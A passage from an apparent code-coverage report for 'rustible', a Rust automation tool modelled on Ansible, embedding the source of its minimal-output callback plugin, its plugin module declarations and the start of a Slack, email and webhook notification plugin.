"Line":0}},{"line":1024,"address":[28605552,28605696],"length":1,"stats":{"Line":0}},{"line":1025,"address":[28605585],"length":1,"stats":{"Line":0}},{"line":1029,"address":[30400651],"length":1,"stats":{"Line":0}},{"line":1030,"address":[30400979],"length":1,"stats":{"Line":0}},{"line":1031,"address":[30400828,30400769],"length":1,"stats":{"Line":0}},{"line":1039,"address":[30400669],"length":1,"stats":{"Line":0}}],"covered":201,"coverable":349},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","minimal.rs"],"content":"//! Minimal callback plugin for Rustible.\n//!\n//! This plugin provides minimal output - only failures and final recap.\n//! Ideal for CI/CD pipelines where less noise is preferred.\n//!\n//! # Features\n//!\n//! - Silent on success: No output for ok/changed tasks\n//! - Failure visibility: Shows task name and error only when failures occur\n//! - Compact format: Single-line format for each host result\n//! - Final recap: Summary of all hosts at the end\n//!\n//! # Example Output\n//!\n//! ```text\n//! FAILED: webserver1 | Install nginx | Package installation failed: apt-get returned 100\n//! FAILED: webserver2 | Configure nginx | File not found: /etc/nginx/nginx.conf\n//!\n//! RECAP: webserver1: ok=5 changed=2 failed=1 skipped=0\n//! RECAP: webserver2: ok=3 changed=1 failed=1 skipped=1\n//! RECAP: dbserver1: ok=8 changed=4 failed=0 skipped=0\n//! ```\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse tokio::sync::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\n/// Minimal callback plugin that shows only failures and final recap.\n///\n/// This callback is designed for CI/CD environments where verbosity\n/// should be minimized but failures must be clearly visible.\n///\n/// # Design Principles\n///\n/// 1. **Silent Success**: Ok and changed results produce no output\n/// 2. **Loud Failures**: Failed tasks show immediately with context\n/// 3. **Compact Summary**: Final recap uses single-line format per host\n/// 4. **No Task Headers**: Task names only shown on failure\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::MinimalCallback;\n///\n/// let callback = MinimalCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct MinimalCallback {\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Whether any failures occurred (for exit code)\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n}\n\nimpl MinimalCallback {\n    /// Creates a new minimal callback plugin.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = MinimalCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self {\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            has_failures: Arc::new(RwLock::new(false)),\n        }\n    }\n\n    /// Returns whether any failures occurred during execution.\n    ///\n    /// Useful for determining exit codes in CI/CD.\n    pub async fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read().await\n    }\n\n    /// Formats a failure message in compact single-line format.\n    fn format_failure(host: \u0026str, task_name: \u0026str, message: \u0026str) -\u003e String {\n        format!(\n            \"{}: {} | {} | {}\",\n            \"FAILED\".red().bold(),\n            host.bright_white().bold(),\n            task_name.yellow(),\n            message\n        )\n    }\n\n    /// Formats an unreachable message in compact single-line format.\n    fn format_unreachable(host: \u0026str, task_name: \u0026str, message: \u0026str) -\u003e String {\n        format!(\n            \"{}: {} | {} | {}\",\n            \"UNREACHABLE\".magenta().bold(),\n            host.bright_white().bold(),\n            task_name.yellow(),\n            message\n        )\n    }\n\n    /// Formats a single host's recap line.\n    fn format_recap_line(host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        let host_color = if stats.failed \u003e 0 || stats.unreachable \u003e 0 {\n            host.red().bold()\n        } else if stats.changed \u003e 0 {\n            host.yellow()\n        } else {\n            host.green()\n        };\n\n        format!(\n            \"{}: {} ok={} changed={} failed={} skipped={} unreachable={}\",\n            \"RECAP\".bright_black(),\n            host_color,\n            stats.ok.to_string().green(),\n            stats.changed.to_string().yellow(),\n            stats.failed.to_string().red(),\n            stats.skipped.to_string().cyan(),\n            stats.unreachable.to_string().magenta(),\n        )\n    }\n}\n\nimpl Default for MinimalCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for MinimalCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            host_stats: Arc::clone(\u0026self.host_stats),\n            start_time: Arc::clone(\u0026self.start_time),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            has_failures: Arc::clone(\u0026self.has_failures),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for MinimalCallback {\n    /// Called when a playbook starts - records start time silently.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut start_time = self.start_time.write().await;\n        *start_time = Some(Instant::now());\n\n        let mut playbook_name = self.playbook_name.write().await;\n        *playbook_name = Some(name.to_string());\n\n        // Clear stats from any previous run\n        let mut stats = self.host_stats.write().await;\n        stats.clear();\n\n        let mut has_failures = self.has_failures.write().await;\n        *has_failures = false;\n    }\n\n    /// Called when a playbook ends - prints the final recap.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read().await;\n        let start_time = self.start_time.read().await;\n\n        // Print empty line before recap for visual separation\n        if !stats.is_empty() {\n            println!();\n        }\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                println!(\"{}\", Self::format_recap_line(host, host_stats));\n            }\n        }\n\n        // Print duration if we have start time\n        if let Some(start) = *start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                \"completed\".green()\n            } else {\n                \"failed\".red().bold()\n            };\n\n            println!(\n                \"\\n{} {} in {:.2}s\",\n                name.bright_white().bold(),\n                status,\n                duration.as_secs_f64()\n            );\n        }\n    }\n\n    /// Called when a play starts - silent in minimal mode.\n    async fn on_play_start(\u0026self, _name: \u0026str, hosts: \u0026[String]) {\n        // Initialize stats for all hosts in this play\n        let mut stats = self.host_stats.write().await;\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n    }\n\n    /// Called when a play ends - silent in minimal mode.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Silent - recap is shown at playbook end\n    }\n\n    /// Called when a task starts - silent in minimal mode.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Silent - we only show output on failure\n    }\n\n    /// Called when a task completes - only shows output on failure.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut stats = self.host_stats.write().await;\n        let host_stats = stats.entry(result.host.clone()).or_default();\n\n        // Update statistics based on result\n        if result.result.skipped {\n            host_stats.skipped += 1;\n        } else if !result.result.success {\n            host_stats.failed += 1;\n\n            // Mark that we have failures\n            let mut has_failures = self.has_failures.write().await;\n            *has_failures = true;\n\n            // Print failure immediately\n            let message = result.result.message.as_str();\n            println!(\n                \"{}\",\n                Self::format_failure(\u0026result.host, \u0026result.task_name, message)\n            );\n        } else if result.result.changed {\n            host_stats.changed += 1;\n            // Silent on change\n        } else {\n            host_stats.ok += 1;\n            // Silent on ok\n        }\n    }\n\n    /// Called when a handler is triggered - silent in minimal mode.\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Silent - handlers are internal details\n    }\n\n    /// Called when facts are gathered - silent in minimal mode.\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Silent - fact gathering is internal\n    }\n}\n\n/// Trait extension for handling unreachable hosts.\n///\n/// This is separate from the main callback trait to allow for\n/// optional implementation by callbacks that care about unreachability.\n#[async_trait]\npub trait UnreachableCallback: ExecutionCallback {\n    /// Called when a host becomes unreachable.\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str);\n}\n\n#[async_trait]\nimpl UnreachableCallback for MinimalCallback {\n    async fn on_host_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, error: \u0026str) {\n        let mut stats = self.host_stats.write().await;\n        let host_stats = stats.entry(host.to_string()).or_default();\n        host_stats.unreachable += 1;\n\n        // Mark that we have failures\n        let mut has_failures = self.has_failures.write().await;\n        *has_failures = true;\n\n        // Print unreachable message immediately\n        println!(\"{}\", Self::format_unreachable(host, task_name, error));\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_minimal_callback_tracks_stats() {\n        let callback = MinimalCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate some task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read().await;\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n        assert_eq!(host1_stats.skipped, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(callback.has_failures().await);\n    }\n\n    #[tokio::test]\n    async fn test_minimal_callback_no_failures() {\n        let callback = MinimalCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        assert!(!callback.has_failures().await);\n    }\n\n    #[tokio::test]\n    async fn test_unreachable_callback() {\n        let callback = MinimalCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        let stats = callback.host_stats.read().await;\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.unreachable, 1);\n\n        assert!(callback.has_failures().await);\n    }\n\n    #[test]\n    fn test_format_failure() {\n        // Just ensure it doesn't panic and produces output\n        let output = MinimalCallback::format_failure(\"host1\", \"Install nginx\", \"Package not found\");\n        assert!(output.contains(\"host1\"));\n        assert!(output.contains(\"Install nginx\"));\n        assert!(output.contains(\"Package not found\"));\n    }\n\n    #[test]\n    fn test_format_recap_line() {\n        let stats = HostStats {\n            ok: 5,\n            changed: 2,\n            failed: 1,\n            skipped: 0,\n            unreachable: 0,\n        };\n\n        let output = MinimalCallback::format_recap_line(\"webserver1\", \u0026stats);\n        assert!(output.contains(\"webserver1\"));\n        assert!(output.contains(\"ok=5\"));\n        assert!(output.contains(\"changed=2\"));\n        assert!(output.contains(\"failed=1\"));\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = MinimalCallback::default();\n        // Just verify it creates successfully\n        assert!(Arc::strong_count(\u0026callback.host_stats) == 1);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = MinimalCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.has_failures,\n            \u0026callback2.has_failures\n        ));\n    }\n}\n","traces":[{"line":91,"address":[24273929,24273923,24273488],"length":1,"stats":{"Line":1}},{"line":93,"address":[24273518],"length":1,"stats":{"Line":1}},{"line":94,"address":[24273565,24273637],"length":1,"stats":{"Line":2}},{"line":95,"address":[24273672,24273758],"length":1,"stats":{"Line":2}},{"line":96,"address":[24273852,24273783],"length":1,"stats":{"Line":2}},{"line":103,"address":[24270112,24270120],"length":1,"stats":{"Line":4}},{"line":104,"address":[26003572],"length":1,"stats":{"Line":3}},{"line":108,"address":[24270128,24270847,24270853],"length":1,"stats":{"Line":1}},{"line":109,"address":[24270449,24270300,24270400],"length":1,"stats":{"Line":1}},{"line":111,"address":[24270215],"length":1,"stats":{"Line":1}},{"line":112,"address":[24270281,24270344],"length":1,"stats":{"Line":2}},{"line":113,"address":[24270381],"length":1,"stats":{"Line":1}},{"line":119,"address":[24273455,24272736,24273461],"length":1,"stats":{"Line":1}},{"line":120,"address":[24273008,24272908,24273057],"length":1,"stats":{"Line":1}},{"line":122,"address":[24272823],"length":1,"stats":{"Line":1}},{"line":123,"address":[24272889,24272952],"length":1,"stats":{"Line":2}},{"line":124,"address":[24272989],"length":1,"stats":{"Line":1}},{"line":130,"address":[24270880,24272707,24272713],"length":1,"stats":{"Line":1}},{"line":131,"address":[24270936],"length":1,"stats":{"Line":1}},{"line":132,"address":[24270963],"length":1,"stats":{"Line":1}},{"line":133,"address":[24271003],"length":1,"stats":{"Line":0}},{"line":134,"address":[24271042],"length":1,"stats":{"Line":0}},{"line":136,"address":[24271019],"length":1,"stats":{"Line":0}},{"line":139,"address":[24271313,24271870,24271641,24271805,24271947,24271477,24271215,24271543,24271707,24271379,24271149],"length":1,"stats":{"Line":1}},{"line":141,"address":[24271053],"length":1,"stats":{"Line":1}},{"line":143,"address":[24271130,24271198,24271266],"length":1,"stats":{"Line":3}},{"line":144,"address":[24271362,24271430,24271290],"length":1,"stats":{"Line":3}},{"line":145,"address":[24271594,24271454,24271526],"length":1,"stats":{"Line":3}},{"line":146,"address":[24271758,24271690,24271618],"length":1,"stats":{"Line":3}},{"line":147,"address":[24271920,24271782,24271854],"length":1,"stats":{"Line":3}},{"line":153,"address":[24274640],"length":1,"stats":{"Line":1}},{"line":154,"address":[24274648],"length":1,"stats":{"Line":1}},{"line":159,"address":[24274352,24274614,24274620],"length":1,"stats":{"Line":1}},{"line":161,"address":[24274384],"length":1,"stats":{"Line":1}},{"line":162,"address":[24274456,24274399],"length":1,"stats":{"Line":2}},{"line":163,"address":[24274515,24274461],"length":1,"stats":{"Line":2}},{"line":164,"address":[24274520],"length":1,"stats":{"Line":1}},{"line":172,"address":[26447206,26447249,26447119,26447320,26449467,26447459,26447951,26447270,26447088,26447291],"length":1,"stats":{"Line":4}},{"line":173,"address":[26131519],"length":1,"stats":{"Line":2}},{"line":174,"address":[26447790,26447700],"length":1,"stats":{"Line":2}},{"line":176,"address":[26131534],"length":1,"stats":{"Line":1}},{"line":177,"address":[26448207,26448644,26448368,26448180,26448306],"length":1,"stats":{"Line":1}},{"line":180,"address":[26131549],"length":1,"stats":{"Line":2}},{"line":181,"address":[26448964,26448899],"length":1,"stats":{"Line":2}},{"line":183,"address":[26448979,26449104,26447299],"length":1,"stats":{"Line":1}},{"line":184,"address":[26449327,26449384],"length":1,"stats":{"Line":2}},{"line":188,"address":[26442337,26442949,26442207,26442508,26444677,26442366,26442294,26442176],"length":1,"stats":{"Line":0}},{"line":189,"address":[26442542,26442324,26442275,26442421],"length":1,"stats":{"Line":0}},{"line":190,"address":[26442963,26442862,26442345,26442783],"length":1,"stats":{"Line":0}},{"line":193,"address":[26443276,26443213],"length":1,"stats":{"Line":0}},{"line":194,"address":[26443303,26443349],"length":1,"stats":{"Line":0}},{"line":198,"address":[26443418,26443337],"length":1,"stats":{"Line":0}},{"line":199,"address":[26443464,26443529],"length":1,"stats":{"Line":0}},{"line":201,"address":[26443728,26443536],"length":1,"stats":{"Line":0}},{"line":202,"address":[26444716,26443796],"length":1,"stats":{"Line":0}},{"line":203,"address":[26444802],"length":1,"stats":{"Line":0}},{"line":208,"address":[26443834,26443899],"length":1,"stats":{"Line":0}},{"line":209,"address":[26443951,26444022],"length":1,"stats":{"Line":0}},{"line":210,"address":[26444037],"length":1,"stats":{"Line":0}},{"line":211,"address":[26444169,26444074],"length":1,"stats":{"Line":0}},{"line":213,"address":[26444043,26444105],"length":1,"stats":{"Line":0}},{"line":216,"address":[26444142,26444215],"length":1,"stats":{"Line":0}},{"line":226,"address":[26441321,26441381,26441296,26441420,26441544,26441989,26442084],"length":1,"stats":{"Line":4}},{"line":228,"address":[26125700],"length":1,"stats":{"Line":2}},{"line":229,"address":[26441774,26441850],"length":1,"stats":{"Line":2}},{"line":230,"address":[26441960,26442017],"length":1,"stats":{"Line":2}},{"line":235,"address":[26441200,26441218],"length":1,"stats":{"Line":0}},{"line":240,"address":[24253869],"length":1,"stats":{"Line":0}},{"line":245,"address":[24254023],"length":1,"stats":{"Line":4}},{"line":246,"address":[26130351],"length":1,"stats":{"Line":2}},{"line":247,"address":[26445609,26445680],"length":1,"stats":{"Line":2}},{"line":250,"address":[26446244,26445781],"length":1,"stats":{"Line":2}},{"line":251,"address":[26446246,26446241,26445825],"length":1,"stats":{"Line":2}},{"line":252,"address":[26445802],"length":1,"stats":{"Line":1}},{"line":253,"address":[26445861,26445935,26445958],"length":1,"stats":{"Line":2}},{"line":256,"address":[26130366],"length":1,"stats":{"Line":2}},{"line":257,"address":[26446504,26446569],"length":1,"stats":{"Line":2}},{"line":260,"address":[26446572],"length":1,"stats":{"Line":1}},{"line":261,"address":[26446780],"length":1,"stats":{"Line":1}},{"line":265,"address":[26445890,26446524,26446947,26446143,26446203],"length":1,"stats":{"Line":4}},{"line":266,"address":[26446200,26446111,26446205],"length":1,"stats":{"Line":2}},{"line":269,"address":[26446145,26446141,26446086],"length":1,"stats":{"Line":2}},{"line":275,"address":[24254227],"length":1,"stats":{"Line":0}},{"line":280,"address":[24254088],"length":1,"stats":{"Line":0}},{"line":297,"address":[24255607],"length":1,"stats":{"Line":4}},{"line":298,"address":[26151711],"length":1,"stats":{"Line":2}},{"line":299,"address":[26450075,26450137],"length":1,"stats":{"Line":2}},{"line":300,"address":[26450225,26450278],"length":1,"stats":{"Line":1}},{"line":303,"address":[26151726],"length":1,"stats":{"Line":2}},{"line":304,"address":[26450608,26450670],"length":1,"stats":{"Line":2}},{"line":307,"address":[26450673],"length":1,"stats":{"Line":1}}],"covered":68,"coverable":91},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","mod.rs"],"content":"//! Callback plugins for customizing Rustible output.\n//!\n//! This module provides various callback plugins that control how\n//! execution progress and results are displayed.\n//!\n//! # Available Plugins\n//!\n//! ## Core Output\n//! - [`DefaultCallback`] - Standard Ansible-like output with colors\n//! - [`MinimalCallback`] - Shows only failures and final recap (ideal for CI/CD)\n//! - [`NullCallback`] - Silent callback that produces no output\n//! - [`OnelineCallback`] - Compact single-line output for log files\n//! - [`SummaryCallback`] - Summary-only output at playbook end\n//!\n//! ## Visual\n//! - [`ProgressCallback`] - Visual progress bars for playbook execution\n//! - [`DiffCallback`] - Shows before/after diffs for changed files\n//! - [`DenseCallback`] - Compact output for large inventories\n//! - [`TreeCallback`] - Hierarchical directory output structure\n//!\n//! ## Timing \u0026 Analysis\n//! - [`TimerCallback`] - Execution timing with summary\n//! - [`ContextCallback`] - Task context with variables/conditions\n//! - [`StatsCallback`] - Comprehensive statistics collection\n//! - [`CounterCallback`] - Task counting and tracking\n//!\n//! ## Filtering\n//! - [`SkippyCallback`] - Minimizes skipped task output (ideal for large playbooks)\n//! - [`SelectiveCallback`] - Filters output by status, host, or patterns\n//! - [`ActionableCallback`] - Only shows changed/failed tasks\n//! - [`FullSkipCallback`] - Detailed skip analysis\n//!\n//! ## Logging\n//! - [`JsonCallback`] - JSON-formatted output\n//! - [`YamlCallback`] - YAML-formatted output\n//! - [`LogFileCallback`] - File-based logging\n//! - [`SyslogCallback`] - System syslog integration\n//! - [`DebugCallback`] - Debug output for development\n//!\n//! ## Integration\n//! - [`NotificationCallback`] - External notifications (Slack, Email, Webhooks)\n//! - [`JUnitCallback`] - JUnit XML output for CI/CD integration\n//! - [`MailCallback`] - Email notifications\n//! - [`ForkedCallback`] - Parallel execution output\n//!\n//! # Example\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::{MinimalCallback, SkippyCallback, DiffCallback};\n//!\n//! // Minimal output for CI\n//! let minimal = MinimalCallback::new();\n//! executor.with_callback(Box::new(minimal));\n//!\n//! // Skippy - hide skipped tasks, show only changes/failures (great for large playbooks)\n//! let skippy = SkippyCallback::new();\n//! executor.with_callback(Box::new(skippy));\n//!\n//! // Skippy with verbosity - show skipped task names\n//! let skippy_verbose = SkippyCallback::with_verbosity(1);\n//! executor.with_callback(Box::new(skippy_verbose));\n//!\n//! // Show diffs for changed files\n//! let diff_callback = DiffCallback::new();\n//! executor.with_callback(Box::new(diff_callback));\n//!\n//! // Combine callbacks with CompositeCallback\n//! let composite = CompositeCallback::new()\n//!     .with_callback(Box::new(MinimalCallback::new()))\n//!     .with_callback(Box::new(DiffCallback::new()));\n//! ```\n\n// ============================================================================\n// Module Declarations\n// ============================================================================\n\n// Core output plugins\nmod default;\nmod minimal;\nmod null;\nmod oneline;\nmod summary;\n\n// Visual plugins\nmod dense;\npub mod diff;\nmod progress;\nmod tree;\n\n// Timing \u0026 analysis plugins\nmod context;\nmod counter;\nmod stats;\nmod timer;\n\n// Filtering plugins\nmod actionable;\nmod full_skip;\nmod selective;\nmod skippy;\n\n// Logging plugins\nmod debug;\nmod json;\nmod logfile;\npub mod notification;\nmod syslog;\nmod yaml;\n\n// Integration plugins\nmod forked;\nmod junit;\nmod mail;\n\n// ============================================================================\n// Default Callback Exports\n// ============================================================================\n\npub use default::{\n    DefaultCallback, DefaultCallbackBuilder, DefaultCallbackConfig, HostStats, Verbosity,\n};\n\n// ============================================================================\n// Core Output Plugin Exports\n// ============================================================================\n\npub use minimal::{MinimalCallback, UnreachableCallback};\npub use null::NullCallback;\npub use oneline::{OnelineCallback, OnelineConfig};\npub use summary::{\n    SummaryCallback, SummaryCallbackBuilder, SummaryConfig, SummaryUnreachableCallback,\n};\n\n// ============================================================================\n// Visual Plugin Exports\n// ============================================================================\n\npub use dense::{DenseCallback, DenseConfig};\npub use diff::{\n    count_changes, generate_diff, has_changes, CompositeCallback, DiffCallback, DiffConfig,\n};\npub use progress::{ProgressCallback, ProgressCallbackBuilder, ProgressConfig};\npub use tree::{\n    TaskMetadata, TaskResultData, TreeCallback, TreeConfig, TreeHostStats, TreeHostSummary,\n    TreePlaybookSummary, TreeUnreachableCallback,\n};\n\n// ============================================================================\n// Timing \u0026 Analysis Plugin Exports\n// ============================================================================\n\npub use context::{\n    ContextCallback, ContextCallbackBuilder, ContextCallbackConfig, ContextVerbosity,\n};\npub use counter::{CounterCallback, CounterCallbackBuilder, CounterConfig};\npub use stats::{\n    DurationHistogram, HostStats as StatsHostStats, MemorySnapshot, ModuleClassification,\n    ModuleStats, PlayStats, PlaybookStats, StatsCallback, StatsConfig,\n};\npub use timer::{TimerCallback, TimerCallbackBuilder, TimerConfig, TimerTaskTiming};\n\n// ============================================================================\n// Filtering Plugin Exports\n// ============================================================================\n\npub use actionable::{ActionableCallback, ActionableConfig, ActionableUnreachableCallback};\npub use full_skip::{FullSkipCallback, FullSkipConfig, HostSkipStats, SkipPattern, SkippedTask};\npub use selective::{\n    FilterMode, SelectiveBuilder, SelectiveCallback, SelectiveConfig, StatusFilter,\n};\npub use skippy::{SkippyCallback, SkippyConfig};\n\n// ============================================================================\n// Logging Plugin Exports\n// ============================================================================\n\npub use debug::{DebugCallback, DebugConfig};\npub use json::{\n    HostStats as JsonHostStats, JsonCallback, JsonCallbackBuilder, JsonEvent, TaskResultJson,\n};\npub use logfile::{\n    HostLogStats, LogEntry, LogEvent, LogFileCallback, LogFileConfig, LogFileConfigBuilder,\n};\npub use syslog::{\n    SeverityMapping, SyslogCallback, SyslogConfig, SyslogConfigBuilder, SyslogError,\n    SyslogFacility, SyslogFormat, SyslogResult, SyslogSeverity, SyslogStats,\n};\npub use yaml::{YamlCallback, YamlConfig, YamlConfigBuilder};\n\n// ============================================================================\n// Integration Plugin Exports\n// ============================================================================\n\npub use forked::{\n    ForkedCallback, ForkedCallbackBuilder, ForkedConfig, ForkedUnreachableCallback, HostState,\n};\npub use junit::JUnitCallback;\npub use junit::UnreachableCallback as JUnitUnreachableCallback;\npub use mail::{MailCallback, MailConfig, MailConfigBuilder, MailUnreachableCallback, TlsMode};\npub use notification::{\n    EmailConfig, FailureDetail, HostStatsSummary, NotificationCallback, NotificationConfig,\n    NotificationPayload, NotificationStatus, SlackConfig, WebhookConfig,\n};\n\n// ============================================================================\n// Trait Re-exports\n// ============================================================================\n\npub use crate::traits::ExecutionCallback;\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","notification.rs"],"content":"//! Notification callback plugin for Rustible.\n//!\n//! This plugin sends notifications to external services on playbook completion\n//! or failure. It supports multiple notification backends:\n//!\n//! - Slack webhooks\n//! - Email notifications (SMTP)\n//! - Generic HTTP webhooks\n//!\n//! # Configuration\n//!\n//! All configuration is done via environment variables:\n//!\n//! ## Slack\n//! - `RUSTIBLE_SLACK_WEBHOOK_URL`: Slack incoming webhook URL\n//! - `RUSTIBLE_SLACK_CHANNEL`: Optional channel override (defaults to webhook default)\n//! - `RUSTIBLE_SLACK_USERNAME`: Optional username override (defaults to \"Rustible\")\n//!\n//! ## Email\n//! - `RUSTIBLE_SMTP_HOST`: SMTP server hostname\n//! - `RUSTIBLE_SMTP_PORT`: SMTP server port (default: 587)\n//! - `RUSTIBLE_SMTP_USER`: SMTP authentication username\n//! - `RUSTIBLE_SMTP_PASSWORD`: SMTP authentication password\n//! - `RUSTIBLE_SMTP_FROM`: Sender email address\n//! - `RUSTIBLE_SMTP_TO`: Recipient email address(es), comma-separated\n//! - `RUSTIBLE_SMTP_TLS`: Use TLS (default: true)\n//!\n//! ## Generic HTTP Webhook\n//! - `RUSTIBLE_WEBHOOK_URL`: HTTP endpoint URL\n//! - `RUSTIBLE_WEBHOOK_METHOD`: HTTP method (default: POST)\n//! - `RUSTIBLE_WEBHOOK_HEADERS`: Optional headers as JSON object\n//! - `RUSTIBLE_WEBHOOK_AUTH_TOKEN`: Optional Bearer token for Authorization header\n//!\n//! ## General Settings\n//! - `RUSTIBLE_NOTIFY_ON_SUCCESS`: Send notification on success (default: false)\n//! - `RUSTIBLE_NOTIFY_ON_FAILURE`: Send notification on failure (default: true)\n//!\n//! # Example Output (Slack)\n//!\n//! ```text\n//! Rustible Playbook Completed\n//! ----------------------------\n//! Playbook: deploy-app.yml\n//! Status: SUCCESS\n//! Duration: 45.2s\n//!\n//! Host Summary:\n//! - webserver1: ok=5 changed=2 failed=0\n//! - webserver2: ok=5 changed=2 failed=0\n//! ```\n\nuse std::collections::HashMap;\nuse std::env;\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse reqwest::Client;\nuse serde::{Deserialize, Serialize};\nuse tokio::sync::RwLock;\nuse tracing::{debug, error, info, warn};\n\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Configuration for notification backends, loaded from environment variables.\n#[derive(Debug, Clone, Default)]\npub struct NotificationConfig {\n    /// Slack configuration\n    pub slack: Option\u003cSlackConfig\u003e,\n    /// Email configuration\n    pub email: Option\u003cEmailConfig\u003e,\n    /// Generic HTTP webhook configuration\n    pub webhook: Option\u003cWebhookConfig\u003e,\n    /// Send notification on successful completion\n    pub notify_on_success: bool,\n    /// Send notification on failure\n    pub notify_on_failure: bool,\n}\n\nimpl NotificationConfig {\n    /// Load configuration from environment variables.\n    ///\n    /// Returns a configuration with all detected notification backends.\n    /// Backends with missing required configuration are skipped.\n    pub fn from_env() -\u003e Self {\n        let slack = SlackConfig::from_env();\n        let email = EmailConfig::from_env();\n        let webhook = WebhookConfig::from_env();\n\n        let notify_on_success = env::var(\"RUSTIBLE_NOTIFY_ON_SUCCESS\")\n            .map(|v| v.eq_ignore_ascii_case(\"true\") || v == \"1\")\n            .unwrap_or(false);\n\n        let notify_on_failure = env::var(\"RUSTIBLE_NOTIFY_ON_FAILURE\")\n            .map(|v| v.eq_ignore_ascii_case(\"true\") || v == 